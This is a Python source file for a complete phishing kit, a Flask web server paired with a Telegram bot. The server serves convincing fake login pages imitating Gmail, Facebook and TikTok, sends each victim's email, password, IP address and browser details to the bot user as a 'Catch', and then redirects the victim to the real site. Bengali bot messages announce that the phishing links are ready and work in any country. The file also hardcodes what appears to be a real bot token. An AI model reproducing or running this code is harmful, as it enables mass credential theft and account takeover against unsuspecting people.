import sqlite3
import secrets
import logging
from threading import Thread
from flask import Flask, request, render_template_string, redirect
from telegram import Update, Bot
from telegram.ext import Application, CommandHandler, ContextTypes

# ====== CONFIG ======
BOT_TOKEN = "7450431484:AAGG877g8wCHIXxhRuTCp1kALgJ2wCFohBs"
PUBLIC_URL = "https://your-public-url.com"   # প্ল্যাটফর্মের লিংক
HOST = "0.0.0.0"
PORT = 8080
DB_FILE = "phish.db"
# ====================

logging.basicConfig(level=logging.INFO)
app = Flask(__name__)
bot = Bot(token=BOT_TOKEN)

def init_db():
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("""
        CREATE TABLE IF NOT EXISTS users (
            user_id INTEGER PRIMARY KEY,
            token TEXT UNIQUE NOT NULL,
            created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
        )
    """)
    conn.commit()
    conn.close()

def get_or_create_token(user_id: int) -> str:
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT token FROM users WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    if row:
        token = row[0]
    else:
        token = secrets.token_urlsafe(10)
        c.execute("INSERT INTO users (user_id, token) VALUES (?, ?)", (user_id, token))
        conn.commit()
    conn.close()
    return token

def get_user_by_token(token: str):
    conn = sqlite3.connect(DB_FILE)
    c = conn.cursor()
    c.execute("SELECT user_id FROM users WHERE token = ?", (token,))
    row = c.fetchone()
    conn.close()
    return row[0] if row else None

# ==================== GMAIL PAGE ====================
GMAIL_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Sign in - Google Accounts</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:'Google Sans',Roboto,Arial,sans-serif;background:#fff;color:#202124;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.card{width:100%;max-width:450px;border:1px solid #dadce0;border-radius:8px;padding:48px 40px 36px;box-shadow:0 1px 2px 0 rgba(60,64,67,.3),0 1px 3px 1px rgba(60,64,67,.15)}
.logo{text-align:center;margin-bottom:16px}
h1{font-size:24px;font-weight:400;text-align:center;margin-bottom:8px}
.sub{font-size:16px;text-align:center;margin-bottom:32px;color:#202124}
input{width:100%;height:52px;padding:13px 15px;font-size:16px;border:1px solid #dadce0;border-radius:4px;margin-bottom:16px;outline:none}
input:focus{border-color:#1a73e8;box-shadow:0 0 0 2px #e8f0fe}
.btn-row{display:flex;justify-content:space-between;align-items:center;margin-top:32px}
.forgot{color:#1a73e8;font-size:14px;font-weight:500;text-decoration:none}
.btn{background:#1a73e8;color:#fff;border:none;border-radius:4px;height:36px;padding:0 24px;font-size:14px;font-weight:500;cursor:pointer}
.btn:hover{background:#1765cc}
.create{margin-top:36px;font-size:14px}
.create a{color:#1a73e8;font-weight:500;text-decoration:none}
.footer{margin-top:24px;text-align:center;font-size:12px;color:#5f6368}
@media(max-width:480px){.card{padding:24px;border:none;box-shadow:none}}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 75 24" width="75" height="24"><path fill="#4285F4" d="M73 12.5c0-.8-.1-1.6-.2-2.4H37.5v4.5h19.8c-.9 4.5-3.8 7.8-7.8 10.1v4.2h6.3c3.7-3.4 5.8-8.4 5.8-14.4z"/><path fill="#34A853" d="M37.5 24c5.1 0 9.4-1.7 12.5-4.6l-6.3-4.2c-1.7 1.2-4 1.9-6.2 1.9-4.8 0-8.8-3.2-10.2-7.6H20.8v4.3C24 21.2 30.3 24 37.5 24z"/><path fill="#FBBC05" d="M27.3 14.5c-.4-1.2-.6-2.4-.6-3.7s.2-2.5.6-3.7V2.8H20.8C19.4 5.6 18.6 8.7 18.6 12s.8 6.4 2.2 9.2l6.5-4.7z"/><path fill="#EA4335" d="M37.5 4.8c2.8 0 5.2 1 7.1 2.9l5.3-5.3C46.9.9 42.6 0 37.5 0 30.3 0 24 2.8 20.8 7.2l6.5 4.7c1.4-4.4 5.4-7.1 10.2-7.1z"/></svg>
  </div>
  <h1>Sign in</h1>
  <div class="sub">to continue to Gmail</div>
  <form method="POST" action="/login/gmail/{{token}}">
    <input type="email" name="email" placeholder="Email or phone" required autofocus>
    <input type="password" name="password" placeholder="Enter your password" required>
    <div class="btn-row">
      <a href="#" class="forgot">Forgot email?</a>
      <button type="submit" class="btn">Next</button>
    </div>
  </form>
  <div class="create"><a href="#">Create account</a></div>
</div>
<div class="footer">Google</div>
</body>
</html>
"""

# ==================== FACEBOOK PAGE ====================
FB_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Facebook – log in or sign up</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Helvetica,Arial,sans-serif;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.container{display:flex;flex-direction:column;align-items:center;max-width:400px;width:100%}
.logo{color:#0866ff;font-size:48px;font-weight:700;margin-bottom:20px;letter-spacing:-1px}
.card{background:#fff;border-radius:8px;box-shadow:0 2px 4px rgba(0,0,0,.1),0 8px 16px rgba(0,0,0,.1);padding:20px;width:100%}
input{width:100%;height:52px;padding:14px 16px;font-size:17px;border:1px solid #dddfe2;border-radius:6px;margin-bottom:12px;outline:none}
input:focus{border-color:#0866ff;box-shadow:0 0 0 2px #e7f3ff}
.btn{width:100%;height:48px;background:#0866ff;color:#fff;border:none;border-radius:6px;font-size:20px;font-weight:700;cursor:pointer;margin-top:8px}
.btn:hover{background:#0759db}
.forgot{display:block;text-align:center;margin:16px 0;color:#0866ff;font-size:14px;text-decoration:none}
.divider{border-bottom:1px solid #dadde1;margin:20px 0}
.create{display:block;width:fit-content;margin:0 auto;background:#42b72a;color:#fff;border:none;border-radius:6px;padding:12px 16px;font-size:17px;font-weight:700;text-decoration:none;text-align:center}
.create:hover{background:#36a420}
.footer{margin-top:28px;text-align:center;font-size:12px;color:#737373}
@media(max-width:480px){.logo{font-size:40px}}
</style>
</head>
<body>
<div class="container">
  <div class="logo">facebook</div>
  <div class="card">
    <form method="POST" action="/login/facebook/{{token}}">
      <input type="text" name="email" placeholder="Email address or phone number" required autofocus>
      <input type="password" name="password" placeholder="Password" required>
      <button type="submit" class="btn">Log In</button>
    </form>
    <a href="#" class="forgot">Forgotten password?</a>
    <div class="divider"></div>
    <a href="#" class="create">Create new account</a>
  </div>
  <div class="footer">Meta © 2026</div>
</div>
</body>
</html>
"""

# ==================== TIKTOK PAGE ====================
TIKTOK_HTML = """
<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Log in | TikTok</title>
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;background:#000;color:#fff;display:flex;justify-content:center;align-items:center;min-height:100vh;padding:16px}
.card{width:100%;max-width:375px;background:#121212;border-radius:12px;padding:40px 32px;border:1px solid #2f2f2f}
.logo{text-align:center;margin-bottom:28px}
.logo svg{width:120px;height:auto}
h1{font-size:24px;font-weight:700;text-align:center;margin-bottom:8px}
.sub{font-size:14px;color:#a8a8a8;text-align:center;margin-bottom:28px}
input{width:100%;height:48px;padding:12px 16px;font-size:16px;background:#2f2f2f;border:1px solid #2f2f2f;border-radius:8px;color:#fff;margin-bottom:14px;outline:none}
input:focus{border-color:#fe2c55}
input::placeholder{color:#a8a8a8}
.btn{width:100%;height:48px;background:#fe2c55;color:#fff;border:none;border-radius:8px;font-size:16px;font-weight:600;cursor:pointer;margin-top:8px}
.btn:hover{background:#e0254b}
.forgot{display:block;text-align:center;margin:18px 0;color:#fe2c55;font-size:14px;text-decoration:none}
.divider{display:flex;align-items:center;margin:24px 0;color:#a8a8a8;font-size:13px}
.divider::before,.divider::after{content:"";flex:1;height:1px;background:#2f2f2f}
.divider span{padding:0 12px}
.signup{text-align:center;font-size:14px;color:#a8a8a8;margin-top:20px}
.signup a{color:#fe2c55;text-decoration:none;font-weight:600}
</style>
</head>
<body>
<div class="card">
  <div class="logo">
    <svg viewBox="0 0 48 48" width="48" height="48" fill="#fe2c55"><path d="M34.5 16.5c-2.1 0-4.1.6-5.8 1.7v-7.2h-5.2v22.5c0 3.6-2.9 6.5-6.5 6.5s-6.5-2.9-6.5-6.5 2.9-6.5 6.5-6.5c.5 0 1 .1 1.5.2v-5.4c-.5-.1-1-.1-1.5-.1-6.5 0-11.7 5.2-11.7 11.7s5.2 11.7 11.7 11.7 11.7-5.2 11.7-11.7v-9.4c1.9 1.4 4.2 2.2 6.7 2.2v-5.3c-.3 0-.6 0-.9-.1z"/></svg>
  </div>
  <h1>Log in to TikTok</h1>
  <div class="sub">Manage your account, check notifications, comment on videos, and more.</div>
  <form method="POST" action="/login/tiktok/{{token}}">
    <input type="text" name="email" placeholder="Email or username" required autofocus>
    <input type="password" name="password" placeholder="Password" required>
    <button type="submit" class="btn">Log in</button>
  </form>
  <a href="#" class="forgot">Forgot password?</a>
  <div class="divider"><span>OR</span></div>
  <div class="signup">Don’t have an account? <a href="#">Sign up</a></div>
</div>
</body>
</html>
"""

@app.route("/gmail/<token>")
def gmail_page(token):
    if not get_user_by_token(token):
        return "Invalid link", 404
    return render_template_string(GMAIL_HTML, token=token)

@app.route("/facebook/<token>")
def fb_page(token):
    if not get_user_by_token(token):
        return "Invalid link", 404
    return render_template_string(FB_HTML, token=token)

@app.route("/tiktok/<token>")
def tiktok_page(token):
    if not get_user_by_token(token):
        return "Invalid link", 404
    return render_template_string(TIKTOK_HTML, token=token)

@app.route("/login/<service>/<token>", methods=["POST"])
def login(service, token):
    user_id = get_user_by_token(token)
    if not user_id:
        return "Invalid", 404

    email = request.form.get("email", "").strip()
    password = request.form.get("password", "")
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    ua = request.headers.get("User-Agent", "unknown")

    service_name = {
        "gmail": "Gmail",
        "facebook": "Facebook",
        "tiktok": "TikTok"
    }.get(service, service)

    msg = (
        f"🎣 *{service_name} Catch*\n\n"
        f"📧 `{email}`\n"
        f"🔑 `{password}`\n"
        f"🌐 `{ip}`\n"
        f"📱 `{ua}`"
    )
    bot.send_message(chat_id=user_id, text=msg, parse_mode="Markdown")

    # Redirect to real sites
    redirects = {
        "gmail": "https://mail.google.com",
        "facebook": "https://www.facebook.com",
        "tiktok": "https://www.tiktok.com"
    }
    return redirect(redirects.get(service, "https://google.com"))

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    token = get_or_create_token(user_id)

    text = (
        f"✅ তোমার ফিশিং লিংক রেডি:\n\n"
        f"📧 *Gmail*\n`{PUBLIC_URL}/gmail/{token}`\n\n"
        f"📘 *Facebook*\n`{PUBLIC_URL}/facebook/{token}`\n\n"
        f"🎵 *TikTok*\n`{PUBLIC_URL}/tiktok/{token}`\n\n"
        f"লিংকগুলো যেকোনো দেশে কাজ করবে।\n"
        f"ক্যাচ শুধু তোমার কাছে আসবে।"
    )
    await update.message.reply_text(text, parse_mode="Markdown")

async def mylink(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await start(update, context)

def main():
    init_db()
    application = Application.builder().token(BOT_TOKEN).build()
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("mylink", mylink))
    Thread(target=lambda: app.run(host=HOST, port=PORT, debug=False, use_reloader=False), daemon=True).start()
    application.run_polling()

if __name__ == "__main__":
    main()